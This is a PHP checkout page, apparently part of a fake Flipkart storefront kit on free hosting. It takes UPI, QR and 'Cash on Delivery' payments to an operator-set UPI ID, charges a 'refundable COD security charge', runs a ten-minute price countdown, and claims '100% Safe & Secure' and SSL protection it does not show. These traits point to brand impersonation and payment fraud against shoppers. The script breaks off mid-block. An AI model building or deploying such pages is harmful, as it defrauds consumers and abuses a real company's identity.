<?php
// Session fix for InfinityFree
if (session_status() === PHP_SESSION_NONE) {
    session_set_cookie_params(['lifetime'=>0,'path'=>'/','secure'=>false,'httponly'=>true,'samesite'=>'Lax']);
    session_start();
}
// ── Read payment settings from JSON — single source of truth ──
$ps_file    = __DIR__ . '/assets/payment_settings.json';
$ps_defaults = [
    'upi_id'        => '',
    'mcc'           => '5262',
    'tr_id'         => '',
    'cod_amount'    => 99,
    'cod_threshold'  => 200,
    'cod_low'        => 49,
    'platform_fee'   => 7,
    'cod_note'       => 'Flipkart COD Security',
    'merchant_name' => 'Flipkart',
];
$ps = $ps_defaults;
if (file_exists($ps_file)) {
    $loaded = json_decode(file_get_contents($ps_file), true);
    if (is_array($loaded)) $ps = array_merge($ps_defaults, $loaded);
}
$upi_id        = addslashes($ps['upi_id']);
$mcc           = preg_replace('/[^0-9]/', '', $ps['mcc'] ?: '5262');
$tr_id         = addslashes($ps['tr_id']);
$cod_amount    = (int)($ps['cod_amount']    ?? 99);
$cod_threshold  = (int)($ps['cod_threshold'] ?? 200);
$cod_low        = (int)($ps['cod_low']       ?? 49);
$platform_fee   = (int)($ps['platform_fee']  ?? 7);
$cod_note      = addslashes($ps['cod_note'] ?: 'Flipkart COD Security');
$merchant_name = addslashes($ps['merchant_name'] ?: 'Flipkart');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/png" href="assets/icons/app-icon.png">
    <link rel="apple-touch-icon" href="assets/icons/app-icon.png">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Payments – Secure Checkout</title>
    <meta name="description" content="Flipkart – payment page">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root {
  --blue: #2874f0;
  --blue-light: #e8f0fe;
  --orange: #fb641b;
  --orange-dark: #e05a17;
  --bg: #f1f3f6;
  --card: #ffffff;
  --border: #e0e0e0;
  --text: #212121;
  --muted: #717171;
  --green: #388e3c;
  --radius: 8px;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Noto Sans', Arial, sans-serif;
  background: var(--bg);
  color: var(--text);
  font-size: 14px;
  padding-bottom: 90px;
}

/* ── HEADER ── */
header {
  background: var(--blue);
  padding: 0 16px;
  height: 56px;
  display: flex;
  align-items: center;
  gap: 14px;
  box-shadow: 0 2px 8px rgba(0,0,0,.18);
  position: sticky;
  top: 0;
  z-index: 100;
}

.h-back, .header-back, .back-btn {
  background: none;
  border: none;
  color: #fff;
  width: 40px;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  border-radius: 50%;
  flex-shrink: 0;
  -webkit-tap-highlight-color: transparent;
  transition: background 0.15s;
}
.h-back:active, .header-back:active, .back-btn:active {
  background: rgba(255,255,255,0.25);
}

.header-title { color: #fff; font-size: 17px; font-weight: 600; }
.header-lock {
  margin-left: auto;
  color: rgba(255,255,255,.9);
  font-size: 12px;
  display: flex;
  align-items: center;
  gap: 4px;
}

/* ── PRODUCT CARD ── */
.product-card {
  background: #fff;
  margin: 10px 12px 0;
  border-radius: var(--radius);
  border: 1px solid var(--border);
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 12px 14px;
  animation: fadeUp .3s ease both;
}
.product-thumb {
  width: 68px; height: 68px;
  border-radius: 8px;
  background: #f5f5f5;
  border: 1px solid #eee;
  object-fit: contain;
  flex-shrink: 0;
  padding: 4px;
}
.product-thumb-placeholder {
  width: 68px; height: 68px;
  border-radius: 8px;
  background: linear-gradient(135deg,#f0f4ff,#e8f0fe);
  border: 1px solid #d0dfff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  flex-shrink: 0;
}
.product-details { flex: 1; min-width: 0; }
.product-brand { font-size: 11px; color: var(--muted); margin-bottom: 2px; text-transform: uppercase; letter-spacing: .04em; }
.product-name {
  font-size: 13.5px;
  font-weight: 600;
  color: var(--text);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  margin-bottom: 5px;
}
.product-price-row { display: flex; align-items: center; gap: 8px; }
.product-price { font-size: 16px; font-weight: 700; color: var(--text); }
.product-mrp { font-size: 12px; color: var(--muted); text-decoration: line-through; }
.product-off { font-size: 12px; color: var(--green); font-weight: 600; }

/* ── OFFER BANNER ── */
.offer-banner {
  background: linear-gradient(180deg,#fffaf2 0%, #fff6ea 100%);
  border: 1px solid #f6d6ab;
  margin: 10px 12px 0;
  border-radius: calc(var(--radius) + 2px);
  padding: 12px 14px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  animation: fadeUp .3s .05s ease both;
  box-shadow: 0 1px 0 rgba(17, 24, 39, 0.03);
}
.offer-main {
  display: flex;
  align-items: flex-start;
  gap: 12px;
  min-width: 0;
  flex: 1;
}
.offer-fire {
  width: 36px;
  height: 36px;
  border-radius: 12px;
  background: linear-gradient(180deg,#fff6ea,#ffe5c8);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  box-shadow: inset 0 0 0 1px rgba(255,109,0,.08);
}
.offer-copy { min-width: 0; }
.offer-kicker {
  font-size: 15px;
  font-weight: 800;
  color: #de6b00;
  line-height: 1.1;
  margin-bottom: 3px;
}
.offer-line {
  font-size: 13px;
  color: #4e342e;
  line-height: 1.4;
}
.offer-sub {
  margin-top: 4px;
  font-size: 11px;
  color: #8d6e63;
}
.timer-inline {
  color: #212121;
  font-weight: 800;
  font-variant-numeric: tabular-nums;
}
.timer-side {
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}
.timer-chip {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 9px 12px;
  border-radius: 999px;
  background: linear-gradient(180deg,#ff7a00,#ff5a00);
  color: #fff;
  box-shadow: 0 8px 16px rgba(255, 109, 0, 0.18);
}
.timer-chip svg {
  display: block;
  flex-shrink: 0;
}
.timer-label {
  font-size: 10px;
  font-weight: 700;
  letter-spacing: .08em;
  text-transform: uppercase;
  color: rgba(255,255,255,.82);
  line-height: 1;
}
.timer-badge {
  color: #fff;
  font-size: 15px;
  font-weight: 800;
  min-width: 52px;
  text-align: center;
  white-space: nowrap;
  font-variant-numeric: tabular-nums;
  letter-spacing: .03em;
  line-height: 1;
}
.timer-chip.ending {
  background: linear-gradient(180deg,#ef5350,#d32f2f);
}
.timer-chip.done {
  background: linear-gradient(180deg,#90a4ae,#607d8b);
  box-shadow: none;
}
@media (max-width: 420px) {
  .offer-banner { align-items: flex-start; }
  .timer-side { align-items: flex-start; margin-top: 8px; }
  .timer-chip { padding: 8px 11px; }
}


/* ── SECTION ── */
.section {
  background: var(--card);
  margin: 10px 12px 0;
  border-radius: var(--radius);
  border: 1px solid var(--border);
  overflow: hidden;
  animation: fadeUp .3s .08s ease both;
}
.section-head {
  padding: 13px 16px 10px;
  font-weight: 700;
  font-size: 12px;
  color: var(--muted);
  text-transform: uppercase;
  letter-spacing: .07em;
  border-bottom: 1px solid var(--border);
  background: #fafafa;
}

/* ── PAY OPTIONS ── */
.pay-option {
  display: flex;
  align-items: center;
  padding: 14px 16px;
  border-bottom: 1px solid #f0f0f0;
  cursor: pointer;
  transition: background .15s;
  gap: 13px;
  position: relative;
}
.pay-option:last-of-type { border-bottom: none; }
.pay-option:hover { background: #f8fbff; }
.pay-option.selected { background: var(--blue-light); }
.pay-option.selected::before {
  content: '';
  position: absolute;
  left: 0; top: 0; bottom: 0;
  width: 3px;
  background: var(--blue);
}
.radio-circle {
  width: 20px; height: 20px;
  border-radius: 50%;
  border: 2px solid #bbb;
  flex-shrink: 0;
  display: flex; align-items: center; justify-content: center;
  transition: border-color .15s;
}
.pay-option.selected .radio-circle { border-color: var(--blue); }
.radio-dot {
  width: 10px; height: 10px;
  border-radius: 50%;
  background: var(--blue);
  display: none;
}
.pay-option.selected .radio-dot { display: block; }
.pay-icon {
  width: 40px; height: 40px;
  border-radius: 10px;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
  font-size: 22px;
}
.pay-info { flex: 1; }
.pay-name { font-weight: 600; font-size: 14px; color: var(--text); }
.pay-sub { font-size: 12px; color: var(--muted); margin-top: 2px; }
.pay-badge {
  font-size: 10px;
  font-weight: 700;
  padding: 2px 7px;
  border-radius: 3px;
  letter-spacing: .03em;
  white-space: nowrap;
}
.badge-rec { background: #e8f5e9; color: #2e7d32; }
.badge-off { background: #e3f2fd; color: #1565c0; }

/* ── UPI INPUT ── */
.upi-input-wrap {
  padding: 12px 16px 16px;
  border-top: 1px dashed #e0e0e0;
  background: #fafbff;
  display: none;
}
.upi-input-label { font-size: 12px; color: var(--muted); margin-bottom: 6px; }
.upi-input-row { display: flex; gap: 8px; }
.upi-input {
  flex: 1;
  border: 1.5px solid #ccc;
  border-radius: 5px;
  padding: 9px 12px;
  font-size: 14px;
  font-family: inherit;
  outline: none;
  transition: border-color .2s;
}
.upi-input:focus { border-color: var(--blue); }
.upi-verify-btn {
  background: var(--blue);
  color: #fff;
  border: none;
  border-radius: 5px;
  padding: 9px 16px;
  font-weight: 600;
  font-size: 13px;
  cursor: pointer;
  font-family: inherit;
  white-space: nowrap;
}

/* ── QR ── */
.qr-wrap {
  padding: 20px 16px 22px;
  display: none;
  flex-direction: column;
  align-items: center;
  border-top: 1px dashed #e0e0e0;
  background: #fafbff;
}
.qr-box {
  background: #fff;
  border: 2px dashed #ccc;
  border-radius: 14px;
  padding: 16px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 2px 12px rgba(0,0,0,.06);
}
.qr-label {
  margin-top: 12px;
  font-size: 13px;
  color: var(--muted);
  text-align: center;
  line-height: 1.6;
}
.qr-apps {
  display: flex;
  gap: 8px;
  margin-top: 10px;
  flex-wrap: wrap;
  justify-content: center;
}
.qr-chip {
  background: #f0f4ff;
  border: 1px solid #c5d5ff;
  border-radius: 20px;
  padding: 3px 10px;
  font-size: 11px;
  color: var(--blue);
  font-weight: 600;
}

/* ── PRICE SUMMARY ── */
.price-section { padding: 4px 0; animation: fadeUp .3s .12s ease both; }
.price-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px 16px;
}
.price-row .lbl { color: var(--muted); }
.price-row .val { font-weight: 500; }
.price-row.saving .val { color: var(--green); }
hr.pdiv { border: none; border-top: 1px dashed #e0e0e0; margin: 4px 16px; }
.price-row.total {
  padding: 14px 16px;
  background: #fafafa;
  border-top: 1px solid var(--border);
}
.price-row.total .lbl { font-weight: 700; font-size: 15px; }
.price-row.total .val { font-weight: 800; font-size: 16px; }

/* ── SECURITY ── */
.security-note {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 10px 16px;
  background: #f9fbe7;
  border-top: 1px solid #e6ee9c;
  font-size: 12px;
  color: #558b2f;
}

/* ── FOOTER ── */
.footer {
  position: fixed;
  bottom: 0; width: 100%;
  background: #fff;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px 16px;
  border-top: 1px solid var(--border);
  box-shadow: 0 -2px 10px rgba(0,0,0,.07);
  z-index: 100;
}
.footer-amount-label { font-size: 11px; color: var(--muted); }
.footer-amount-value { font-size: 17px; font-weight: 700; color: var(--text); }
.pay-btn {
  background: linear-gradient(135deg,#ff9800,#fb641b);
  border: none;
  padding: 13px 28px;
  font-weight: 700;
  font-size: 14px;
  color: #fff;
  border-radius: var(--radius);
  cursor: pointer;
  font-family: inherit;
  letter-spacing: .04em;
  box-shadow: 0 3px 8px rgba(251,100,27,.35);
  transition: all .2s;
  display: flex;
  align-items: center;
  gap: 8px;
}
.pay-btn:hover {
  transform: translateY(-1px);
  box-shadow: 0 5px 14px rgba(251,100,27,.4);
}
.pay-btn:active { transform: translateY(0); }

/* ── NO PRODUCT ERROR ── */
.error-box {
  background: #fff3f3;
  border: 1px solid #ffcdd2;
  border-radius: var(--radius);
  margin: 20px 12px;
  padding: 20px;
  text-align: center;
}
.error-box h3 { color: var(--red, #d32f2f); margin-bottom: 8px; }
.error-box p { color: var(--muted); font-size: 13px; margin-bottom: 14px; }
.error-box button {
  background: var(--blue);
  color: #fff;
  border: none;
  border-radius: 6px;
  padding: 10px 24px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
}

/* ── TOAST ── */
.toast {
  position: fixed;
  bottom: 90px;
  left: 50%;
  transform: translateX(-50%);
  background: #323232;
  color: white;
  padding: 10px 20px;
  border-radius: 24px;
  font-size: 13px;
  z-index: 9999;
  opacity: 0;
  transition: opacity .3s;
  pointer-events: none;
  white-space: nowrap;
}
.toast.show { opacity: 1; }

@keyframes fadeUp {
  from { opacity: 0; transform: translateY(12px); }
  to { opacity: 1; transform: translateY(0); }
}

/* ══ MOBILE RESPONSIVE FIX ══ */
html, body {
    max-width: 100% !important;
    overflow-x: hidden !important;
    width: 100% !important;
}
*, *::before, *::after {
    box-sizing: border-box !important;
    max-width: 100% !important;
}
img, video, iframe, table {
    max-width: 100% !important;
    height: auto;
}
input, select, textarea, button {
    max-width: 100% !important;
}
</style>
    <link rel="stylesheet" href="assets/shared.css?v=20260320">
</head>
<body data-fk-sync="auth,cart">

<!-- HEADER -->
<header>
  <button class="header-back" onclick="goBackSmart('cart.php')">
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="white"/></svg>
  </button>
  <span class="header-title">Secure Checkout</span>
  <span class="header-lock">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="white"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
    100% Safe &amp; Secure
  </span>
</header>

<!-- PRODUCT BEING PURCHASED -->
<div class="product-card" id="productCard">
  <div class="product-thumb-placeholder" id="productThumbPlaceholder"><svg viewBox="0 0 24 24" width="36" height="36" fill="#bdbdbd"><path d="M18 6h-2c0-2.21-1.79-4-4-4S8 3.79 8 6H6c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-6-2c1.1 0 2 .9 2 2h-4c0-1.1.9-2 2-2zm6 16H6V8h2v2c0 .55.45 1 1 1s1-.45 1-1V8h4v2c0 .55.45 1 1 1s1-.45 1-1V8h2v12z"/></svg></div>
  <img class="product-thumb" id="productThumb" src="" alt="" style="display:none;" onerror="this.style.display='none'; document.getElementById('productThumbPlaceholder').style.display='flex';">
  <div class="product-details">
    <div class="product-brand" id="productBrand">Loading...</div>
    <div class="product-name" id="productName">Loading product...</div>
    <div class="product-price-row">
      <span class="product-price" id="productPrice">₹0</span>
      <span class="product-mrp" id="productMrp"></span>
      <span class="product-off" id="productOff"></span>
    </div>
  </div>
</div>

<!-- OFFER TIMER -->
<div class="offer-banner" id="offerBanner">
  <div class="offer-main">
    <div class="offer-fire" aria-hidden="true">
      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M13.5.67s.74 2.65.74 4.8c0 2.06-1.35 3.73-3.41 3.73-2.07 0-3.63-1.67-3.63-3.73l.03-.36C5.21 7.51 4 10.62 4 14c0 4.42 3.58 8 8 8s8-3.58 8-8C20 8.61 17.41 3.8 13.5.67z" fill="#ff6d00"/>
      </svg>
    </div>
    <div class="offer-copy">
      <div class="offer-kicker">Special Price</div>
      <div class="offer-line">Complete payment in <span class="timer-inline" id="timerInline">09:59</span> to place your order at the shown price.</div>
      <div class="offer-sub" id="offerSubline" style="display:none"></div>
    </div>
  </div>
  <div class="timer-side">
    <div class="timer-chip" id="timerChip">
      <svg viewBox="0 0 24 24" width="15" height="15" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path d="M12 6V12L15.75 14.25" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="white" stroke-width="2"/>
      </svg>
      <span class="timer-label">Ends in</span>
      <span class="timer-badge" id="timerDisplay">09:59</span>
    </div>
  </div>
</div>

<!-- PAYMENT OPTIONS -->
<div class="section">
  <div class="section-head">Choose Payment Method</div>

  <!-- PhonePe -->
  <div id="opt-phonepe" class="pay-option selected" onclick="selectApp('phonepe')">
    <div class="radio-circle"><div class="radio-dot"></div></div>
    <div class="pay-icon" style="background:#f3ecff;">
      <img src="assets/icon.php?name=phonepe" alt="PhonePe" width="34" height="34" style="border-radius:8px;object-fit:contain;display:block;">
    </div>
    <div class="pay-info">
      <div class="pay-name">PhonePe</div>
      <div class="pay-sub">UPI, Wallet &amp; Cards</div>
    </div>
    <span class="pay-badge badge-rec">RECOMMENDED</span>
  </div>

  <!-- Google Pay -->
  <div id="opt-gpay" class="pay-option" onclick="selectApp('gpay')">
    <div class="radio-circle"><div class="radio-dot"></div></div>
    <div class="pay-icon" style="background:#f1f8ff;">
      <img src="assets/icon.php?name=gpay" alt="Google Pay" width="34" height="34" style="border-radius:8px;object-fit:contain;display:block;">
    </div>
    <div class="pay-info">
      <div class="pay-name">Google Pay</div>
      <div class="pay-sub">Fast &amp; secure UPI</div>
    </div>
  </div>

  <!-- Paytm -->
  <div id="opt-paytm" class="pay-option" onclick="selectApp('paytm')">
    <div class="radio-circle"><div class="radio-dot"></div></div>
    <div class="pay-icon" style="background:#e3f7ff;">
      <img src="assets/icon.php?name=paytm" alt="Paytm" width="34" height="34" style="border-radius:8px;object-fit:contain;display:block;">
    </div>
    <div class="pay-info">
      <div class="pay-name">Paytm</div>
      <div class="pay-sub">UPI &amp; Paytm Wallet</div>
    </div>
    <span class="pay-badge badge-off">5% OFF</span>
  </div>

  <!-- Other UPI -->
  <div id="opt-upi" class="pay-option" onclick="selectApp('upi')">
    <div class="radio-circle"><div class="radio-dot"></div></div>
    <div class="pay-icon" style="background:#fff3e0;">
      <img src="assets/icon.php?name=upi" alt="UPI" width="34" height="34" style="border-radius:8px;object-fit:contain;display:block;">
    </div>
    <div class="pay-info">
      <div class="pay-name">Other UPI App</div>
      <div class="pay-sub">Enter your UPI ID</div>
    </div>
  </div>

  <!-- UPI ID Input -->
  <div class="upi-input-wrap" id="upiInputSection">
    <div class="upi-input-label">Enter your UPI ID (e.g. name@upi)</div>
    <div class="upi-input-row">
      <input class="upi-input" id="upiIdInput" type="text" placeholder="yourname@okhdfcbank">
      <button class="upi-verify-btn" onclick="verifyUPI()">VERIFY</button>
    </div>
  </div>

  <!-- Scan QR -->
  <div id="opt-scan" class="pay-option" onclick="selectApp('scan')">
    <div class="radio-circle"><div class="radio-dot"></div></div>
    <div class="pay-icon" style="background:#f1f3f6;">
      <svg width="34" height="34" viewBox="0 0 24 24" fill="none">
        <rect x="3" y="3" width="7" height="7" rx="1" stroke="#555" stroke-width="1.8"/>
        <rect x="14" y="3" width="7" height="7" rx="1" stroke="#555" stroke-width="1.8"/>
        <rect x="3" y="14" width="7" height="7" rx="1" stroke="#555" stroke-width="1.8"/>
        <rect x="5" y="5" width="3" height="3" fill="#555"/><rect x="16" y="5" width="3" height="3" fill="#555"/>
        <rect x="5" y="16" width="3" height="3" fill="#555"/>
        <path d="M14 14h2v2h-2zM18 14h3v2h-3zM14 18h2v3h-2zM18 18h3v3h-3z" fill="#555"/>
      </svg>
    </div>
    <div class="pay-info">
      <div class="pay-name">Scan &amp; Pay</div>
      <div class="pay-sub">Any UPI App — Scan QR Code</div>
    </div>
  </div>

  <!-- QR Code -->
  <div class="qr-wrap" id="qrSection">
    <div class="qr-box"><div id="qrcode"></div></div>
    <p class="qr-label">Scan with any UPI app to pay <b id="qrAmountLabel">₹0</b></p>
    <div class="qr-apps">
      <span class="qr-chip">PhonePe</span>
      <span class="qr-chip">Google Pay</span>
      <span class="qr-chip">Paytm</span>
      <span class="qr-chip">BHIM</span>
    </div>
  </div>

  <!-- Cash on Delivery -->
  <div id="opt-cod" class="pay-option" onclick="selectApp('cod')">
    <div class="radio-circle"><div class="radio-dot"></div></div>
    <div class="pay-icon" style="background:#fff8e1;">
      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="2" y="6" width="20" height="13" rx="2" stroke="#4caf50" stroke-width="1.8"/>
        <circle cx="12" cy="12" r="3" stroke="#4caf50" stroke-width="1.8"/>
        <path d="M6 6V5a2 2 0 012-2h8a2 2 0 012 2v1" stroke="#4caf50" stroke-width="1.5"/>
      </svg>
    </div>
    <div class="pay-info">
      <div class="pay-name">Cash on Delivery</div>
      <div class="pay-sub">Pay when your order arrives</div>
    </div>
    <span class="pay-badge" style="background:#fff3e0;color:#e65100;">COD</span>
  </div>

  <!-- COD Security Info Box -->
  <div id="codInfoSection" style="display:none; padding:16px; background:#fffde7; border-top:1px dashed #ffe082;">
    <div style="display:flex; align-items:flex-start; gap:12px;">
      <div style="flex-shrink:0"><svg viewBox="0 0 24 24" width="32" height="32" fill="#555"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></div>
      <div>
        <div style="font-weight:700; font-size:14px; color:#e65100; margin-bottom:6px;">COD Security Charge — <span id="codFeeDisplay">₹<?= $cod_amount ?></span></div>
        <div style="font-size:12.5px; color:#5d4037; line-height:1.7;">
          To confirm your Cash on Delivery order, a one-time <b>refundable security charge of <span id="codFeeDisplay2">₹<?= $cod_amount ?></span></b> is required.<br><br>
          <svg viewBox="0 0 24 24" width="14" height="14" fill="#388e3c" style="vertical-align:-2px;margin-right:4px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> This amount is <b>fully refunded</b> at the time of delivery.<br>
          <svg viewBox="0 0 24 24" width="14" height="14" fill="#388e3c" style="vertical-align:-2px;margin-right:4px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> This prevents fake orders and ensures delivery success.<br>
          <svg viewBox="0 0 24 24" width="14" height="14" fill="#388e3c" style="vertical-align:-2px;margin-right:4px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Pay securely via UPI — takes less than 30 seconds.
        </div>
        <div style="margin-top:12px; background:#fff; border:1.5px solid #ffe082; border-radius:8px; padding:10px 14px; display:flex; justify-content:space-between; align-items:center;">
          <div>
            <div style="font-size:11px; color:#888; margin-bottom:2px;">Security Charge (Refundable)</div>
            <div style="font-size:20px; font-weight:800; color:#212121;" id="codSecurityDisplay">₹<?= $cod_amount ?></div>
          </div>
          <div style="text-align:right;">
            <div style="font-size:11px; color:#888; margin-bottom:2px;">Rest Pay on Delivery</div>
            <div style="font-size:16px; font-weight:700; color:#388e3c;" id="codRestAmount">₹0</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>



<!-- PRICE SUMMARY -->
<div class="section">
  <div class="section-head">Price Details</div>
  <div class="price-section">
    <div class="price-row">
      <span class="lbl" id="summaryItemLabel">Price (1 item)</span>
      <span class="val" id="summaryMrp">₹0</span>
    </div>
    <div class="price-row saving">
      <span class="lbl">Discount</span>
      <span class="val" id="summaryDiscount">-₹0</span>
    </div>
    <div class="price-row saving">
      <span class="lbl">Delivery Charges</span>
      <span class="val" id="summaryDelivery">FREE</span>
    </div>
    <div class="price-row saving" id="donationDisplayRow" style="display:none">
      <span class="lbl">Donation</span>
      <span class="val" id="donationDisplayVal">+₹0</span>
    </div>
    <div class="price-row saving" id="platformFeeRow" style="display:none">
      <span class="lbl">Platform Fee</span>
      <span class="val" id="platformFeeVal">+₹<?= $platform_fee ?></span>
    </div>

    <hr class="pdiv">
    <div class="price-row total">
      <span class="lbl">Amount Payable</span>
      <span class="val" id="summaryTotal">₹0</span>
    </div>
  </div>
  <div class="security-note">
    <svg width="15" height="15" viewBox="0 0 24 24" fill="#558b2f"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
    Your payment is protected by 256-bit SSL encryption
  </div>
</div>

<div style="height:8px;"></div>

<!-- FOOTER -->
<div class="footer">
  <div class="footer-amount">
    <div class="footer-amount-label" id="footerLabel">Total Payable</div>
    <div class="footer-amount-value" id="footerAmount">₹0</div>
  </div>
  <button class="pay-btn" onclick="payNow()">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
    <span id="payBtnText">PAY NOW</span>
  </button>
</div>

<div class="toast" id="toast"></div>

<?php
// UPI ID is never sent to the client — served via upi_link.php on demand
// amount placeholder for JS to read
?>
<span id="_upi_ref" style="display:none" data-fee="<?= (int)($ps['platform_fee'] ?? 0) ?>"></span>

<!-- QR Library -->
<!-- QR library loaded on demand when Scan & Pay is selected -->

<script>
// ══════════════════════════════════════════════════
//  ADDRESS GUARD — bina address ke payment nahi
(function(){
  var addr = localStorage.getItem('pay_address') || '';
  var list = [];
  try { list = JSON.parse(localStorage.getItem('fk_addresses') || '[]'); } catch(e){}
  if (!list.length || !addr.trim()) {
    alert('⚠️ Pehle address add aur select karo!');
    window.location.replace('address.php');
  }
})();

//  READ PRODUCT DATA FROM localStorage
// ══════════════════════════════════════════════════
const donationAmt     = parseFloat(localStorage.getItem('pay_donation') || '0');
const deliveryFee     = parseFloat(localStorage.getItem('pay_delivery') || '0');
const checkoutTotal   = parseFloat(localStorage.getItem('pay_total') || '0') || 0;
const productAmount   = parseFloat(localStorage.getItem('pay_price') || '0') || 0;
const payAmount       = checkoutTotal || productAmount;
const payMrp          = parseFloat(localStorage.getItem('pay_mrp')) || productAmount || payAmount;
const payName         = localStorage.getItem('pay_name')  || 'Product';
const payBrand        = localStorage.getItem('pay_brand') || '';
const payOff          = localStorage.getItem('pay_off')   || '';
const payImg          = localStorage.getItem('pay_img')   || '';
const payQty          = parseInt(localStorage.getItem('pay_qty') || '1', 10) || 1;
const isEmiCheckout   = localStorage.getItem('pay_emi_enabled') === '1';
const emiMonths       = parseInt(localStorage.getItem('pay_emi_plan') || '0', 10) || 0;
const emiMonthly      = parseFloat(localStorage.getItem('pay_emi_monthly') || '0') || 0;
const payableBaseAmount = (isEmiCheckout && emiMonthly > 0) ? emiMonthly : (checkoutTotal || productAmount);
function getUpiChargeAmount(){ return checkoutTotal > 0 ? (checkoutTotal + PLATFORM_FEE) : (payableBaseAmount + PLATFORM_FEE + donationAmt); }
function getCodBaseAmount(){ return checkoutTotal > 0 ? checkoutTotal : (payableBaseAmount + donationAmt); }

// ── If no product found, show error ──
if (!payAmount && !payableBaseAmount) {
  document.getElementById('productCard').innerHTML = `
    <div class="error-box" style="width:100%;text-align:center;padding:14px 0;">
      <p style="color:#d32f2f;font-weight:600;font-size:14px;"><svg viewBox="0 0 24 24" width="14" height="14" fill="#d32f2f" style="vertical-align:-2px;margin-right:4px"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg> No product selected!</p>
      <p style="color:#878787;font-size:12px;margin-top:4px;">Please go back and tap <b>Buy Now</b> on a product.</p>
    </div>`;
  setTimeout(function(){ window.location.href = 'cart.php'; }, 1200);
}

// ── Populate product card ──
document.getElementById('productBrand').textContent  = payBrand.toUpperCase();
document.getElementById('productName').textContent   = payName;
document.getElementById('productPrice').textContent  = '₹' + (payableBaseAmount || payAmount).toLocaleString('en-IN');
document.getElementById('productOff').textContent    = payOff;

if (payMrp && payMrp > (productAmount || payableBaseAmount || payAmount)) {
  document.getElementById('productMrp').textContent = '₹' + payMrp.toLocaleString('en-IN');
}

if (payImg) {
  const img = document.getElementById('productThumb');
  img.src = payImg;
  img.style.display = 'block';
  document.getElementById('productThumbPlaceholder').style.display = 'none';
}
if (isEmiCheckout && emiMonths > 0) {
  document.getElementById('productOff').textContent = 'EMI plan • ' + emiMonths + ' months';
}

// ── Populate price summary ──
const discount = payMrp > (productAmount || payableBaseAmount || payAmount) ? payMrp - (productAmount || payableBaseAmount || payAmount) : 0;
document.getElementById('summaryItemLabel').textContent = 'Price (' + payQty + (payQty === 1 ? ' item)' : ' items)');
document.getElementById('summaryMrp').textContent      = '₹' + payMrp.toLocaleString('en-IN');
document.getElementById('summaryDiscount').textContent  = discount > 0 ? '-₹' + discount.toLocaleString('en-IN') : '₹0';
const PLATFORM_FEE = <?= $platform_fee ?>; // injected early for summary
// Populate delivery row
const _delEl = document.getElementById('summaryDelivery');
if (_delEl) {
  _delEl.textContent = deliveryFee > 0 ? '+₹' + deliveryFee : 'FREE';
